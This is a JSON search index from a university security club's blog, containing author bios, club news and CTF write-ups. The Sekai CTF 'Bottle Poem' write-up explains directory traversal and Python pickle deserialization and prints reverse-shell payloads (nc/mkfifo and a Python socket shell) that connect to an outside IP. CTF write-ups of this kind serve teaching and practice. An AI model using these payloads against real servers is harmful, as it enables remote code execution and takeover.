[{"authors":null,"categories":null,"content":"Some Background Informations I am FazeCT, a Reverser from team BKISC, HCMC University of Technology. I have been studying in Computer Science, HCMC University of Technology since October 2021.\nStarted playing CTFs since July 2022, currently I am focusly learning in the Reverse Engineering (RE) field of CTF.\nI am also looking forward to learn more about Pwnable in the future.\nNoticeable Achievements Qualified for ISITDTU CTF 2022 Finals\nRanked 57th in 2022 ACM-ICPC Asia HoChiMinh City Regional Contest\n","date":1673841054,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1673841054,"objectID":"e7c86612d2a48e15b6888aa79a874f7c","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/author/fazect/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/bkisc.com-blog-page/author/fazect/","section":"authors","summary":"Some Background Informations I am FazeCT, a Reverser from team BKISC, HCMC University of Technology. I have been studying in Computer Science, HCMC University of Technology since October 2021.\nStarted playing CTFs since July 2022, currently I am focusly learning in the Reverse Engineering (RE) field of CTF.","tags":null,"title":"FazeCT","type":"authors"},{"authors":null,"categories":null,"content":"hdthinh1012 (Thinh Huynh Duc) is a Computer Science student studying at Ho Chi Minh University of Technology.\n","date":1673481600,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1673481600,"objectID":"82f26d50ab3ef4f3c9efe0569c2150db","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/author/hdthinh1012/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/bkisc.com-blog-page/author/hdthinh1012/","section":"authors","summary":"hdthinh1012 (Thinh Huynh Duc) is a Computer Science student studying at Ho Chi Minh University of Technology.","tags":null,"title":"hdthinh1012","type":"authors"},{"authors":null,"categories":null,"content":"BK Information Security Club BKISC (Bach Khoa Information Security Club) was founded in July 2022 by Dr.Nguyen An Khuong and senior members from Efiens Security Club, comprised mainly of students from Ho Chi Minh University of Technology (HCMUT). We were founded to provide studying, researching, cooperating environments for those interested in cyber security.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/author/bkisc/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/bkisc.com-blog-page/author/bkisc/","section":"authors","summary":"BK Information Security Club BKISC (Bach Khoa Information Security Club) was founded in July 2022 by Dr.Nguyen An Khuong and senior members from Efiens Security Club, comprised mainly of students from Ho Chi Minh University of Technology (HCMUT).","tags":null,"title":"BKISC","type":"authors"},{"authors":["Nguyễn An Khương"],"categories":null,"content":"Dr. Nguyen An Khuong is a lecturer and researcher at the Faculty of Computer Science and Engineering, Ho Chi Minh City University of Technology (HCMUT). He receives his PhD in Mathematics from the University of Groningen, The Netherlands in 2008. Among of his current interests are applied cryptography, blockchain technology, and applied machine learning.\nIn terms of services, he was a member of the editorial board of the Bulletin of Vietnamese Mathematical Society (2012-2018), and contributed to the Vietnamese editions of “Modern Industrial Statistics: with applications in R, MINITAB and JMP” by R. Kenett, S. Zacks and “Elements” by Euclid of Alexandria as a co-translator. He is also a mentor and supervisor for Efiens team and BKISC team from HCMUT. His research profile is available at https://www.researchgate.net/profile/Khuong_Nguyen-An\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"f49ea8a282d107f926e610dccbe0d71c","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/author/nguyen-an-khuong/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/bkisc.com-blog-page/author/nguyen-an-khuong/","section":"authors","summary":"Dr. Nguyen An Khuong is a lecturer and researcher at the Faculty of Computer Science and Engineering, Ho Chi Minh City University of Technology (HCMUT). He receives his PhD in Mathematics from the University of Groningen, The Netherlands in 2008.","tags":null,"title":"Nguyễn An Khương","type":"authors"},{"authors":["FazeCT"],"categories":null,"content":" Table of Contents Introduction Finding the location Getting further informations Finding the deleted tweet Exploring the killer’s GitHub Conclusion Introduction Given image: Get it here!\nDescription: I feel the killer might be dangerous so I have some info to give you but I don’t want to disclose my email just like that. So find my review from the image below and send me an email asking for info. Be creative with the signature so I know its you. It is time to find Who is the killer.\nCategory: OSINT\nFinding the location From the given image, I managed to have found the location on Google Maps at 41.154248, -8.682320.\nThen in the comment section of the location, I got the mentioned secret email, labeled noodlesareramhackers@gmail.com.\nGetting further informations I then sent an email to the email above, and got the next instructions.\nFinding the deleted tweet In the first challenge of the Osint Crime Confusion set (W is for Where), I found the instagram of a person named Heather James.\nThen from this person’s informations, I found the twitter account of University of Dutch ThE of Topics in Science.\nI then immediately knew we have to bring the account to the Wayback Machine to gain access to the deleted tweet. The email did mention about the tweet’s id (1612383535549059076), so we can paste this URL into the Wayback Machine: https://twitter.com/UThE_TS/status/1612383535549059076\nWe successfully gained access to the deleted tweet!\nExploring the killer’s GitHub From the email, we also know that we should continue searching in GitHub. Frankly enough, when I tried to search for “potatoes eating camels” in GitHub, this showed up:\nThe descriptions imply that the person is “still improving wiki”. We then head into the wiki of this repository to find out the end of our journey.\nConcatenate the first letters of the last 7 sentences of the poem, we have our flag for the challenge: idek{JULIANA_APOSIDM723489}.\nConclusion A good OSINT challenge overall, consist of several general skills in the field of OSINT, such as using Wayback Machine or finding locations on Google Maps.\n","date":1673841054,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673841054,"objectID":"52c028b7047c41e2b3988f4917b783fa","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/blog/fazect/idekctf2022_osintcrime3/","publishdate":"2023-01-16T03:50:54Z","relpermalink":"/bkisc.com-blog-page/blog/fazect/idekctf2022_osintcrime3/","section":"blog","summary":"An in-depth writeup on idekCTF 2022 - Osint/Osint Crime Confusion 3.","tags":["ctf","writeup","osint","idekctf-2022"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","type":"blog"},{"authors":["FazeCT"],"categories":null,"content":" Table of Contents Introduction Static Analysis Reaching case 14 Reaching case 1 Patch the binary Result Introduction Given binary: Get it here!\nDescription: If you can make the program runs faster, you’ll get the flag!\nCategory: Reverse Engineering\nStatic Analysis The challenge provides us with a single binary, named slow.exe. By using IDA Pro or Ghidra or any other kinds of decompiler, we will get the decompiled code.\nAnalyze the main function, we claim that the program initiates an array whose size is 45, then modifies it through some more functions, as shown below.\nint __cdecl main(int argc, const char **argv, const char **envp) { void *Block; // [esp+4h] [ebp-BCh] int v5[45]; // [esp+8h] [ebp-B8h] BYREF v5[0] = 10; v5[1] = -3; ... snip v5[43] = 14; v5[44] = 16; Block = (void *)sub_401AC0(v5, 38, 0); sub_4013B0(Block); sub_401B40(Block); return 0; } The function sub_401AC0(v5, 38, 0) allocates dynamic memory using malloc based on v5 then assigns it into variable Block. That variable is then being passed into function sub_4013B0(Block), which will produce our flag once we have fixed it.\nint __cdecl sub_4013B0(_DWORD *a1) { int result; // eax int v2; // eax int v3; // [esp+4h] [ebp-64h] ... snip int v37; // [esp+64h] [ebp-4h] int v38; // [esp+64h] [ebp-4h] while ( 1 ) { v6 = *(_DWORD *)(a1[1] + 4 * a1[3]++); result = v6 - 1; switch ( v6 ) { case 1: v22 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v26 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v2 = sub_401110(v26, v22); v16 = a1[4] + 1; a1[4] = v16; *(_DWORD *)(a1[2] + 4 * v16) = v2; break; case 2: ... snip case 4: ... snip case 5: ... snip case 6: ... snip case 7: ... snip case 8: ... snip case 9: ... snip case 10: ... snip case 11: ... snip case 12: ... snip case 13: ... snip case 14: v38 = *(_DWORD *)(a1[2] + 4 * a1[4]--); sub_401040(\u0026#34;RESULT: %d\\n\u0026#34;, v38); sub_401260(v38); break; case 15: ... snip case 16: ... snip case 17: ... snip case 18: ... snip default: continue; } } } It is easy to observe that only case 1 and case 14 involve calling other functions.\nTo be more precise, if the program reaches case 1, the function sub_401110(v26, v22) will be called, and on the other hand, if the program reaches case 14, the function sub_401260(v38) will be called. We will talk more about these two functions in the next parts of this blog.\nReaching case 14 As stated earlier, the function sub_401260(v38) will be called if the program reaches case 14, which will be the last part of our code flow.\nint __cdecl sub_401260(char a1) { char v2[256]; // [esp+10h] [ebp-224h] BYREF char Buffer; // [esp+110h] [ebp-124h] BYREF _BYTE v4[3]; // [esp+111h] [ebp-123h] BYREF char v5[32]; // [esp+210h] [ebp-24h] BYREF qmemcpy(v5, \u0026#34;Áõ\u0026#34;, 2); v5[2] = -77; v5[3] = 26; ... snip v5[28] = -66; v5[29] = 63; memset(v2, 0, sizeof(v2)); sub_401D50(\u0026amp;Buffer, \u0026#34;%d\u0026#34;, 55 * a1); sub_401160(v5, v2, 30, \u0026amp;Buffer, \u0026amp;v4[strlen(\u0026amp;Buffer)] - v4); return sub_401040(\u0026#34;flag is: %s\u0026#34;, (char)v2); } The function receives our modified variable Block, then uses it to produce our flag.\nReaching case 1 Here is where things get interesting. Take a look at the function sub_401110(v26, v22), we can conclude that this is why our program runs slowly. The fact that it makes our program sleeps plus it is possibly called many times throughout the process makes our executable runs without any output for a very long time.\nint __cdecl sub_401110(int a1, int a2) { int v3; // [esp+0h] [ebp-4h] v3 = sub_4010F0(0); Sleep(1000 * a1); Sleep(1000 * a2); return sub_4010F0(0) - v3; } The algorithm here is very simple, however this is author’s idea to let the program sleeps for a total of (a1 + a2) seconds each time this function is called. The intended result of this function is to return a1 + a2. We will have to patch the binary to get our flag.\nPatch the binary So we know what makes our program runs slowly, it is time to fix that. Below is the decompiled assembly code of that part.\nmov ecx, [ebp+arg_0] mov edx, [ecx+10h] sub edx, 1 mov eax, [ebp+arg_0] mov [eax+10h], edx mov ecx, [ebp+var_10] push ecx mov edx, [ebp+var_C] push edx call sub_401110 add esp, 8 mov [ebp+var_58], eax mov eax, [ebp+arg_0] Instead of calling sub_401110, we should patch the program to directly calculates ecx + edx then assigns it into eax. We find out that the opcode of call sub_401110 is E8 77 FC FF FF.\nUsing IDA Pro integrated settings, which can be found at Options \u0026gt; Generals \u0026gt; Number of Opcode bytes (non-graph) set to a large enough number, we can view each instruction’s opcode.\nWith pwntools library, we also find out the opcode for add ecx, edx and move eax, ecx is 01 D1 and 89 C8 using this script written in Python below.\nfrom pwn import * context.arch = \u0026#39;amd64\u0026#39; print(asm(\u0026#39;add ecx, edx\u0026#39;)) print(asm(\u0026#39;mov eax, ecx\u0026#39;)) It is now time to patch the binary. Use any hex editor of your choice to patch the binary, here I use IDA Pro’s integrated hex view to patch the binary.\nChange E8 77 FC FF FF to 01 D1 89 C8 90 using any hex editor of your choice (here 90 corresponds to the NOP …","date":1673624694,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673624694,"objectID":"40a209ad7f2b9aede0004e8de94746bc","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/blog/fazect/isitdtu-2022-slow/","publishdate":"2023-01-13T16:17:00Z","relpermalink":"/bkisc.com-blog-page/blog/fazect/isitdtu-2022-slow/","section":"blog","summary":"An in-depth writeup on ISITDTU CTF 2022 Finals - Slow.","tags":["ctf","writeup","re","isitdtu-2022"],"title":"ISITDTU CTF 2022 Finals - Slow","type":"blog"},{"authors":["hdthinh1012"],"categories":null,"content":" Table of Contents Problem statement Basic Python Bottle Pickle exploit The exercise step Generate cookie Reference Links Problem statement Author hints that flag is executable\nThe website is vulnerable to directory traversal Pick /etc/self/procline to get the start application command So the application source is located at /app/app.py from bottle import route, run, template, request, response, error from config.secret import sekai import os import re @route(\u0026#34;/\u0026#34;) def home(): return template(\u0026#34;index\u0026#34;) @route(\u0026#34;/show\u0026#34;) def index(): response.content_type = \u0026#34;text/plain; charset=UTF-8\u0026#34; param = request.query.id if re.search(\u0026#34;^../app\u0026#34;, param): return \u0026#34;No!!!!\u0026#34; requested_path = os.path.join(os.getcwd() + \u0026#34;/poems\u0026#34;, param) try: with open(requested_path) as f: tfile = f.read() except Exception as e: return \u0026#34;No This Poems\u0026#34; return tfile @error(404) def error404(error): return template(\u0026#34;error\u0026#34;) @route(\u0026#34;/sign\u0026#34;) def index(): try: session = request.get_cookie(\u0026#34;name\u0026#34;, secret=sekai) if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: session = {\u0026#34;name\u0026#34;: \u0026#34;guest\u0026#34;} response.set_cookie(\u0026#34;name\u0026#34;, session, secret=sekai) return template(\u0026#34;guest\u0026#34;, name=session[\u0026#34;name\u0026#34;]) if session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: return template(\u0026#34;admin\u0026#34;, name=session[\u0026#34;name\u0026#34;]) except: return \u0026#34;pls no hax\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: os.chdir(os.path.dirname(__file__)) run(host=\u0026#34;0.0.0.0\u0026#34;, port=8080) If run the code at local change the set_cookie’s session argument to {”name”:”admin”} will get the admin page but it just a trap\nThe hint said flag is executable, meaning RCE is possible.\nBasic Let’s have a look at Python Bottle\nPython Bottle Bottle signed cookie Bottle first:\npickle.dumps([name, value], -1) then base64 encode → encoded hmac encrypt the secret seperately then base64 encode → signature add ‘!’ at the first char and ‘?’ in between signature Cookie format: !secret_hmac_base64==?pickle_name_value_base64==\nBottle verify cookie get_cookie:\n… base64 decode the pickled then call pickle.loads(pickle.dumps([’name’, “Pickle dumps containing RCE here”], -1)) We have controlled the value input through cookie\nPickle exploit Ref Byte-stream created by pickle.dumps contains opcodes that are then one-by-one executed as soon as we load the pickle back in. If you are curious how the instructions in this pickle look like, you can use pickletools to create a disassembly: pickletools.dis(pickled)\n\u0026gt;\u0026gt;\u0026gt; pickled = pickle.dumps([\u0026#39;pickle\u0026#39;, \u0026#39;me\u0026#39;, 1, 2, 3]) \u0026gt;\u0026gt;\u0026gt; import pickletools \u0026gt;\u0026gt;\u0026gt; pickletools.dis(pickled) 0: \\x80 PROTO 4 2: \\x95 FRAME 25 11: ] EMPTY_LIST 12: \\x94 MEMOIZE (as 0) 13: ( MARK 14: \\x8c SHORT_BINUNICODE \u0026#39;pickle\u0026#39; 22: \\x94 MEMOIZE (as 1) 23: \\x8c SHORT_BINUNICODE \u0026#39;me\u0026#39; 27: \\x94 MEMOIZE (as 2) 28: K BININT1 1 30: K BININT1 2 32: K BININT1 3 34: e APPENDS (MARK at 13) 35: . STOP pickle still allows you to define a custom behavior for the pickling process for your class instances.\nThe __reduce__() method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “reduce value”). […] When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order: A callable object that will be called to create the initial version of the object. A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. […] So by implementing __reduce__ in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.\nSo if any value in the array pass into pickle.dumps is an instance containing __reduce__(…) function, that reduce will be executed when calling pickle.loads(…). And the __reduce__(…) implement demand returns an tuple with first value an executable, callable method in python for example (os.system, eval or any function), the second value is argument of the callable.\nSo by implement reduce method that return (eval, (\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;curl xxx|bash\u0026#34;)\u0026#39;,)) , we can execute code on the server.\nThe exercise step Generate cookie Add an class definition with __reduce__ method (that return reverse shell python code) to create an instance, then pass the instance to the session1[’name’] that passed into set_cookie.\nclass RCE: def __reduce__(self): # 14.186.174.164 cmd = (\u0026#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 14.186.174.164 55555 \u0026gt; /tmp/f\u0026#39;) return os.system, ((f\u0026#34;\u0026#34;\u0026#34;python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;14.186.174.164\u0026#34;,55555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026#34;\u0026#34;\u0026#34;),) # Test @route(\u0026#34;/sign\u0026#34;) def index(): session = request.get_cookie(\u0026#34;name\u0026#34;, secret=sekai) print(session[\u0026#34;name\u0026#34;]) if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: objWithReduce = RCE() session = …","date":1673481600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673481600,"objectID":"2256b16fb9515e2dc5aa0a85914de4e5","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/","publishdate":"2023-01-12T00:00:00Z","relpermalink":"/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/","section":"blog","summary":"Deserialization attack with Python Bottle.","tags":["ctf","writeup","web exploitation"],"title":"Sekai CTF 2022 Bottle Poem","type":"blog"},{"authors":null,"categories":null,"content":"Ngày 15/10/2022, câu lạc bộ BKISC có 2 đội tham dự vòng thi sơ khảo ASCIS 2022 bảng VN2 đã đạt được hai giải khuyến khích đó là đội COPIUM (hạng 17) và BKISC (hạng 9). Trong đó xin chúc mừng BKISC lọt vào vòng chung khảo ASCIS 2022 sẽ diễn ra vào ngày 13/11/2022.\n","date":1665792e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1665792e3,"objectID":"3775ebd6f365f84f10893592a700a57c","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/post/22-10-25-ascis-2022-so-khao/","publishdate":"2022-10-15T00:00:00Z","relpermalink":"/bkisc.com-blog-page/post/22-10-25-ascis-2022-so-khao/","section":"post","summary":"Ngày 15/10/2022, câu lạc bộ BKISC có 2 đội tham dự vòng thi sơ khảo ASCIS 2022 bảng VN2 đã đạt được hai giải khuyến khích đó là đội COPIUM (hạng 17) và BKISC (hạng 9).","tags":null,"title":"Câu lạc bộ BKISC tham gia vòng sơ khảo ASCIS 2022","type":"post"},{"authors":[],"categories":null,"content":" ","date":1662400800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1662400800,"objectID":"b5eaca94b40ea8028a014bf4da285bb5","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/event/2022-09-05-thaidn-talk/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/bkisc.com-blog-page/event/2022-09-05-thaidn-talk/","section":"event","summary":"Anh Dương Ngọc Thái, hiện đang làm việc tại Google và thường được biết đến thông qua blog cá nhân vnhacker@blogspot, sẽ kể về những lần tham gia kiểm thử và tấn công hệ thống của một số bệnh viện và ngân hàng ở Việt Nam. Qua đó, anh nói lên tầm quan trọng của kiểm thử bảo mật phần mềm và chính sách breach notification nhằm nâng cao nhận thức về bảo vệ thông tin người dùng của doanh nghiệp.","tags":[],"title":"Grokking Techtalk 46: Những bài học về xâm nhập và bảo vệ hệ thống mạng Việt Nam","type":"event"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"6d99026b9e19e4fa43d5aadf147c7176","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/contact/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/bkisc.com-blog-page/contact/","section":"","summary":"","tags":null,"title":"","type":"widget_page"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"62f29b617f905dd761b82d25a24bf276","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/members/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/bkisc.com-blog-page/members/","section":"","summary":"","tags":null,"title":"","type":"widget_page"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"8e3aab287e330ba4efa5040ba790d4eb","permalink":"https://blog.bkisc.com/bkisc.com-blog-page/introduction/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/bkisc.com-blog-page/introduction/","section":"","summary":"","tags":null,"title":"Introduction","type":"widget_page"}]